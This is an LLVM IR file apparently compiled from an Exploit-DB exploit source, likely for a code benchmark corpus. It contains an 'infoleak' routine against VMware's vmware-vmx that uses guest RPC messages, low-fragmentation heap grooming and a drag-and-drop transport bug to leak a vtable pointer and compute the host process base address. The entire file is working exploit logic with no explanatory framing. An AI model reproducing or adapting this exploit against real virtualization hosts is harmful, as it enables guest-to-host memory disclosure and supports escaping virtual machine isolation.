; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_44533.c_infoleak.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_44533.c_infoleak.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@cbObj = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"guest.upgrader_send_cmd_line_args %s\00", align 1
@tov4 = common dso_local global i8* null, align 8
@chgver = common dso_local global i8* null, align 8
@tov2 = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [20 x i8] c"Message send error!\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"\A0u\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"\A0t\00", align 1
@dndtransport = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [2 x i8] c"B\00", align 1
@readstring = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [22 x i8] c"Trying to leak vtable\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"Leak content: %p\0A\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"vmware-vmx base: %p\0A\00", align 1
@MAX_LFH_BLOCK = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @infoleak() #0 {
  %1 = alloca [5 x i32*], align 16
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32*, align 8
  %10 = alloca i32*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = bitcast [5 x i32*]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %15, i8 0, i64 40, i1 false)
  store i32 0, i32* %2, align 4
  br label %16

16:                                               ; preds = %49, %0
  %17 = load i32, i32* %2, align 4
  %18 = icmp slt i32 %17, 5
  br i1 %18, label %19, label %52

19:                                               ; preds = %16
  %20 = call i32* @Message_Open(i32 1229148242)
  %21 = load i32, i32* %2, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [5 x i32*], [5 x i32*]* %1, i64 0, i64 %22
  store i32* %20, i32** %23, align 8
  %24 = load i32, i32* %2, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds [5 x i32*], [5 x i32*]* %1, i64 0, i64 %25
  %27 = load i32*, i32** %26, align 8
  %28 = icmp ne i32* %27, null
  br i1 %28, label %29, label %37

29:                                               ; preds = %19
  %30 = load i32, i32* %2, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [5 x i32*], [5 x i32*]* %1, i64 0, i64 %31
  %33 = load i32*, i32** %32, align 8
  %34 = load i32, i32* @cbObj, align 4
  %35 = sub nsw i32 %34, 1
  %36 = call i32 @Message_SendSize(i32* %33, i32 %35)
  br label %48

37:                                               ; preds = %19
  %38 = load i32, i32* %2, align 4
  %39 = sub nsw i32 %38, 1
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [5 x i32*], [5 x i32*]* %1, i64 0, i64 %40
  %42 = load i32*, i32** %41, align 8
  %43 = call i32 @Message_Close(i32* %42)
  %44 = load i32, i32* %2, align 4
  %45 = sub nsw i32 %44, 1
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [5 x i32*], [5 x i32*]* %1, i64 0, i64 %46
  store i32* null, i32** %47, align 8
  br label %52

48:                                               ; preds = %29
  br label %49

49:                                               ; preds = %48
  %50 = load i32, i32* %2, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %2, align 4
  br label %16

52:                                               ; preds = %37, %16
  %53 = call i32 (...) @PrepareLFH()
  store i32 0, i32* %3, align 4
  br label %54

54:                                               ; preds = %70, %52
  %55 = load i32, i32* %3, align 4
  %56 = icmp slt i32 %55, 5
  br i1 %56, label %57, label %73

57:                                               ; preds = %54
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [5 x i32*], [5 x i32*]* %1, i64 0, i64 %59
  %61 = load i32*, i32** %60, align 8
  %62 = icmp ne i32* %61, null
  br i1 %62, label %63, label %69

63:                                               ; preds = %57
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [5 x i32*], [5 x i32*]* %1, i64 0, i64 %65
  %67 = load i32*, i32** %66, align 8
  %68 = call i32 @Message_Close(i32* %67)
  br label %69

69:                                               ; preds = %63, %57
  br label %70

70:                                               ; preds = %69
  %71 = load i32, i32* %3, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %3, align 4
  br label %54

73:                                               ; preds = %54
  store i8* null, i8** %4, align 8
  %74 = load i32, i32* @cbObj, align 4
  %75 = call i8* @malloc(i32 %74)
  store i8* %75, i8** %5, align 8
  %76 = load i8*, i8** %5, align 8
  %77 = load i32, i32* @cbObj, align 4
  %78 = call i32 @memset(i8* %76, i8 signext 65, i32 %77)
  %79 = load i8*, i8** %5, align 8
  %80 = load i32, i32* @cbObj, align 4
  %81 = sub nsw i32 %80, 1
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %79, i64 %82
  store i8 0, i8* %83, align 1
  %84 = load i8*, i8** %5, align 8
  %85 = call i8* @stringf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i8* %84)
  store i8* %85, i8** %6, align 8
  br label %86

86:                                               ; preds = %73, %245
  store i32 0, i32* %7, align 4
  br label %87

87:                                               ; preds = %107, %86
  %88 = load i32, i32* %7, align 4
  %89 = icmp slt i32 %88, 512
  br i1 %89, label %90, label %110

90:                                               ; preds = %87
  %91 = load i8*, i8** @tov4, align 8
  %92 = load i8*, i8** @tov4, align 8
  %93 = call i32 @strlen(i8* %92)
  %94 = call i32 @RpcOut_SendOneRaw(i8* %91, i32 %93, i8** %4, i32* null)
  %95 = load i8*, i8** @chgver, align 8
  %96 = load i8*, i8** @chgver, align 8
  %97 = call i32 @strlen(i8* %96)
  %98 = call i32 @RpcOut_SendOneRaw(i8* %95, i32 %97, i8** %4, i32* null)
  %99 = load i8*, i8** @tov2, align 8
  %100 = load i8*, i8** @tov2, align 8
  %101 = call i32 @strlen(i8* %100)
  %102 = call i32 @RpcOut_SendOneRaw(i8* %99, i32 %101, i8** %4, i32* null)
  %103 = load i8*, i8** @chgver, align 8
  %104 = load i8*, i8** @chgver, align 8
  %105 = call i32 @strlen(i8* %104)
  %106 = call i32 @RpcOut_SendOneRaw(i8* %103, i32 %105, i8** %4, i32* null)
  br label %107

107:                                              ; preds = %90
  %108 = load i32, i32* %7, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %7, align 4
  br label %87

110:                                              ; preds = %87
  store i32 0, i32* %8, align 4
  br label %111

111:                                              ; preds = %131, %110
  %112 = load i32, i32* %8, align 4
  %113 = icmp slt i32 %112, 512
  br i1 %113, label %114, label %134

114:                                              ; preds = %111
  %115 = call i32* @Message_Open(i32 1229148242)
  store i32* %115, i32** %9, align 8
  %116 = load i32*, i32** %9, align 8
  %117 = icmp eq i32* %116, null
  br i1 %117, label %118, label %121

118:                                              ; preds = %114
  %119 = call i32 @puts(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %120 = call i32 @Sleep(i32 100)
  br label %130

121:                                              ; preds = %114
  %122 = load i32*, i32** %9, align 8
  %123 = load i32, i32* @cbObj, align 4
  %124 = sub nsw i32 %123, 1
  %125 = call i32 @Message_SendSize(i32* %122, i32 %124)
  %126 = load i32*, i32** %9, align 8
  %127 = call i32 @Message_RawSend(i32* %126, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i32 2)
  %128 = load i32*, i32** %9, align 8
  %129 = call i32 @Message_Close(i32* %128)
  br label %130

130:                                              ; preds = %121, %118
  br label %131

131:                                              ; preds = %130
  %132 = load i32, i32* %8, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %8, align 4
  br label %111

134:                                              ; preds = %111
  %135 = call i32* @Message_Open(i32 1229148242)
  store i32* %135, i32** %10, align 8
  %136 = load i32*, i32** %10, align 8
  %137 = load i32, i32* @cbObj, align 4
  %138 = sub nsw i32 %137, 1
  %139 = call i32 @Message_SendSize(i32* %136, i32 %138)
  %140 = load i32*, i32** %10, align 8
  %141 = call i32 @Message_RawSend(i32* %140, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 2)
  %142 = load i8*, i8** @dndtransport, align 8
  %143 = load i8*, i8** @dndtransport, align 8
  %144 = call i32 @strlen(i8* %143)
  %145 = call i32 @RpcOut_SendOneRaw(i8* %142, i32 %144, i8** %4, i32* null)
  store i32 0, i32* %11, align 4
  br label %146

146:                                              ; preds = %242, %134
  %147 = load i32, i32* %11, align 4
  %148 = load i32, i32* @cbObj, align 4
  %149 = sub nsw i32 %148, 3
  %150 = call i32 @min(i32 %149, i32 512)
  %151 = icmp slt i32 %147, %150
  br i1 %151, label %152, label %245

152:                                              ; preds = %146
  %153 = load i8*, i8** %6, align 8
  %154 = load i8*, i8** %6, align 8
  %155 = call i32 @strlen(i8* %154)
  %156 = call i32 @RpcOut_SendOneRaw(i8* %153, i32 %155, i8** %4, i32* null)
  %157 = load i32*, i32** %10, align 8
  %158 = call i32 @Message_RawSend(i32* %157, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i32 1)
  %159 = load i8*, i8** @readstring, align 8
  %160 = load i8*, i8** @readstring, align 8
  %161 = call i32 @strlen(i8* %160)
  %162 = call i32 @RpcOut_SendOneRaw(i8* %159, i32 %161, i8** %4, i32* null)
  %163 = load i8*, i8** %4, align 8
  %164 = getelementptr inbounds i8, i8* %163, i64 0
  %165 = load i8, i8* %164, align 1
  %166 = sext i8 %165 to i32
  %167 = icmp eq i32 %166, 65
  br i1 %167, label %168, label %241

168:                                              ; preds = %152
  %169 = load i8*, i8** %4, align 8
  %170 = getelementptr inbounds i8, i8* %169, i64 1
  %171 = load i8, i8* %170, align 1
  %172 = sext i8 %171 to i32
  %173 = icmp eq i32 %172, 65
  br i1 %173, label %174, label %241

174:                                              ; preds = %168
  %175 = load i8*, i8** %4, align 8
  %176 = load i8*, i8** %5, align 8
  %177 = call i64 @strcmp(i8* %175, i8* %176)
  %178 = icmp ne i64 %177, 0
  br i1 %178, label %179, label %241

179:                                              ; preds = %174
  %180 = load i32*, i32** %10, align 8
  %181 = call i32 @Message_Close(i32* %180)
  store i32 0, i32* %12, align 4
  br label %182

182:                                              ; preds = %237, %179
  %183 = load i32, i32* %12, align 4
  %184 = icmp slt i32 %183, 512
  br i1 %184, label %185, label %240

185:                                              ; preds = %182
  %186 = call i32 @puts(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0))
  %187 = load i8*, i8** @tov4, align 8
  %188 = load i8*, i8** @tov4, align 8
  %189 = call i32 @strlen(i8* %188)
  %190 = call i32 @RpcOut_SendOneRaw(i8* %187, i32 %189, i8** %4, i32* null)
  %191 = load i8*, i8** @chgver, align 8
  %192 = load i8*, i8** @chgver, align 8
  %193 = call i32 @strlen(i8* %192)
  %194 = call i32 @RpcOut_SendOneRaw(i8* %191, i32 %193, i8** %4, i32* null)
  %195 = load i8*, i8** @readstring, align 8
  %196 = load i8*, i8** @readstring, align 8
  %197 = call i32 @strlen(i8* %196)
  %198 = call i32 @RpcOut_SendOneRaw(i8* %195, i32 %197, i8** %4, i32* null)
  store i64 0, i64* %13, align 8
  %199 = load i8*, i8** %4, align 8
  %200 = icmp ne i8* %199, null
  br i1 %200, label %201, label %209

201:                                              ; preds = %185
  %202 = load i8*, i8** %4, align 8
  %203 = load i8*, i8** %4, align 8
  %204 = call i32 @strlen(i8* %203)
  %205 = call i32 @min(i32 %204, i32 8)
  %206 = call i32 @memcpy(i64* %13, i8* %202, i32 %205)
  %207 = load i64, i64* %13, align 8
  %208 = call i32 @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i64 0, i64 0), i64 %207)
  br label %209

209:                                              ; preds = %201, %185
  %210 = load i64, i64* %13, align 8
  %211 = and i64 %210, 65535
  store i64 %211, i64* %14, align 8
  %212 = load i64, i64* %14, align 8
  %213 = icmp eq i64 %212, 29864
  br i1 %213, label %220, label %214

214:                                              ; preds = %209
  %215 = load i64, i64* %14, align 8
  %216 = icmp eq i64 %215, 29904
  br i1 %216, label %220, label %217

217:                                              ; preds = %214
  %218 = load i64, i64* %14, align 8
  %219 = icmp eq i64 %218, 30256
  br i1 %219, label %220, label %228

220:                                              ; preds = %217, %214, %209
  %221 = load i64, i64* %13, align 8
  %222 = and i64 %221, -65536
  %223 = sub i64 %222, 7995392
  %224 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0), i64 %223)
  %225 = load i64, i64* %13, align 8
  %226 = and i64 %225, -65536
  %227 = sub i64 %226, 7995392
  ret i64 %227

228:                                              ; preds = %217
  %229 = load i8*, i8** @tov2, align 8
  %230 = load i8*, i8** @tov2, align 8
  %231 = call i32 @strlen(i8* %230)
  %232 = call i32 @RpcOut_SendOneRaw(i8* %229, i32 %231, i8** %4, i32* null)
  %233 = load i8*, i8** @chgver, align 8
  %234 = load i8*, i8** @chgver, align 8
  %235 = call i32 @strlen(i8* %234)
  %236 = call i32 @RpcOut_SendOneRaw(i8* %233, i32 %235, i8** %4, i32* null)
  br label %237

237:                                              ; preds = %228
  %238 = load i32, i32* %12, align 4
  %239 = add nsw i32 %238, 1
  store i32 %239, i32* %12, align 4
  br label %182

240:                                              ; preds = %182
  br label %241

241:                                              ; preds = %240, %174, %168, %152
  br label %242

242:                                              ; preds = %241
  %243 = load i32, i32* %11, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %11, align 4
  br label %146

245:                                              ; preds = %146
  %246 = load i32*, i32** %10, align 8
  %247 = call i32 @Message_Close(i32* %246)
  br label %86
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32* @Message_Open(i32) #2

declare dso_local i32 @Message_SendSize(i32*, i32) #2

declare dso_local i32 @Message_Close(i32*) #2

declare dso_local i32 @PrepareLFH(...) #2

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i8* @stringf(i8*, i8*) #2

declare dso_local i32 @RpcOut_SendOneRaw(i8*, i32, i8**, i32*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @puts(i8*) #2

declare dso_local i32 @Sleep(i32) #2

declare dso_local i32 @Message_RawSend(i32*, i8*, i32) #2

declare dso_local i32 @min(i32, i32) #2

declare dso_local i64 @strcmp(i8*, i8*) #2

declare dso_local i32 @memcpy(i64*, i8*, i32) #2

declare dso_local i32 @printf(i8*, i64) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
